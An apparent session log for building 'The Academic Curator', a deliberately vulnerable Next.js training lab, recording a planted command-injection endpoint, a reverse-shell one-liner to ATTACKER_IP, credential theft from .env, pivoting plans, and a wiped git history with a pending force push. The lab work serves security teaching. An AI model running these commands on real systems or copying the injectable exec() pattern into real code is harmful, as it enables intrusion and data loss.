# SESSION CONTEXT: June 12, 2026

## 1. Project Status
**The Academic Curator** — Vulnerable E-Learning Platform is now fully functional with a confirmed, working RCE exploit chain. All documentation has been updated to reflect the actual attack path. Git history has been cleaned for lab distribution.

## 2. Critical Discovery: React 19 `decodeReply` Protection

The single most important finding of today's session:

**React 19 / Next.js 16 built-in Prototype Pollution protection:**
- The RSC decoder (`decodeReply()`) in `react-server-dom-turbopack-server.node.production.js` contains explicit checks: `"__proto__" === key ? null : (parentObject[key] = cachedPromise)`
- This means **ALL `__proto__` keys are silently stripped** before data reaches any Server Action.
- The previous attack path (Server Action + `__proto__` Prototype Pollution) was **fundamentally broken** on Next.js 16 — it could never have worked.
- Evidence: All prior requests via Server Action fell back to the default `echo` command in `/tmp/assignment_logs.txt`, confirming `logCommand` was never polluted.

**Additionally:** Even when `__proto__` pollution succeeds via `JSON.parse` + `deepMerge` (e.g., through a REST API route), Node.js 24 / Turbopack crashes with `TypeError: Getter must be a function: <polluted_value>` because the polluted `Object.prototype` corrupts internal Turbopack/Prisma property lookups before `exec()` can run.

## 3. Completed Work Today (June 12)

### A. New RCE Attack Path — REST API Command Injection ✅
- **Created:** `app/api/assignments/route.ts` — A REST API endpoint that uses standard `JSON.parse` (bypasses React 19's `decodeReply` protection).
- **Vulnerability:** Direct Command Injection via unsanitized `logCommand` field passed to `child_process.exec()`.
- **Payload format:** Simple JSON object with `"logCommand": "bash -c '...'"` field.
- **Confirmed RCE:** `touch /tmp/pwned && echo RCE_CONFIRMED > /tmp/pwned` → file created successfully.
- **Confirmed Reverse Shell:** User received shell via `nc -lvnp 4444` after sending payload from Burp Suite.

### B. Documentation Overhaul ✅
- **`Lab_Walkthrough.md`:** Complete rewrite of Stage 3 (RCE) to use the `/api/assignments` REST endpoint instead of Server Action `__proto__` path. Includes background explanation of why Server Actions are protected.
- **`README.md`:** Complete rewrite as a vulnerable lab project README with: kill chain diagram, vulnerability catalog, network topology, default credentials, architecture with vuln markers, and disclaimer.

### C. Git History Cleanup ✅
- Deleted entire `.git` directory and reinitialized repository from scratch.
- All 51 previous commits (from multiple contributors: Khoa, Lâm, Annn2702, etc.) permanently removed.
- Single clean commit: `"Initial commit: The Academic Curator — Vulnerable E-Learning Platform (React2Shell Lab)"`.
- Remote re-attached to `https://github.com/quoclam2111/e-learning-ui` (requires `git push --force origin main` to sync).

## 4. The React2Shell Attack Chain (UPDATED — Confirmed Working)

| Stage | Attack | Endpoint | Method |
|-------|--------|----------|--------|
| 1 | Register STUDENT account | `POST /register` | Browser |
| 2 | Mass Assignment: STUDENT → LECTURER | Server Action via Burp (inject `"role":"LECTURER"`) | Burp Suite |
| 3 | Command Injection → RCE | `POST /api/assignments` with `"logCommand"` | Burp Repeater |
| 4 | Reverse Shell | `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` | Netcat |
| 5 | Post-Exploitation | `cat .env` → credentials → pivot to 172.20.0.5 | Shell |

### Key Differences from Previous Sessions:
- ❌ ~~Server Action + `__proto__` Prototype Pollution~~ → Blocked by React 19 `decodeReply`
- ❌ ~~`deepMerge` polluting `Object.prototype`~~ → Crashes Node.js 24 runtime
- ✅ **REST API + `logCommand` Command Injection** → Stable, reliable, confirmed

## 5. Files Modified/Created Today

| File | Action | Description |
|------|--------|-------------|
| `app/api/assignments/route.ts` | **NEW** | Vulnerable REST API endpoint (Command Injection via `logCommand` → `exec()`) |
| `Lab_Walkthrough.md` | **REWRITTEN** | Stage 3 updated to REST API path, removed old Server Action instructions |
| `README.md` | **REWRITTEN** | Full vuln lab README with kill chain, arch diagram, creds, disclaimer |
| `.git/` | **RESET** | Entire git history wiped, fresh single-commit repository |

## 6. Pending / Next Steps (For Future Sessions)
- **Lab Packaging:** Finalize Docker/OVA packaging for student distribution.
- **Pivot Testing:** Set up internal network `172.20.0.5` and verify Chisel/SSH pivoting.
- **Persistence Testing:** Validate crontab reverse shell persistence mechanism.
- **Force Push:** Run `git push --force origin main` to sync clean history to GitHub.
- **REACT2SHELL_CONTEXT.md:** Update to reflect the new REST API attack path (currently still references `__proto__` Server Action path).
